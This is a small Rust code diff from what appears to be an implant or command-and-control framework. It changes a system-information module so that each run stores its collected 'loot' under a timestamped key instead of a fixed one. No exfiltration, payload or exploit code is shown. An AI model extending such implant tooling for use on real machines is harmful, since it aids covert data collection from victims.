@@ -67,7 +67,9 @@ impl ImplantModule for SysInfo {
                 };
 
                 let bytes = serde_json::to_vec(&info).unwrap_or_default();
-                ctx.store_loot(LootKind::Telemetry, "sysinfo/last", bytes).await?;
+                // Timestamped, not a fixed key: each run keeps its own
+                // snapshot instead of overwriting the last one.
+                ctx.store_loot(LootKind::Telemetry, module_sdk::timestamped_key("sysinfo"), bytes).await?;
                 ctx.progress(Some(100), "done");
 
                 raw_params(&info)
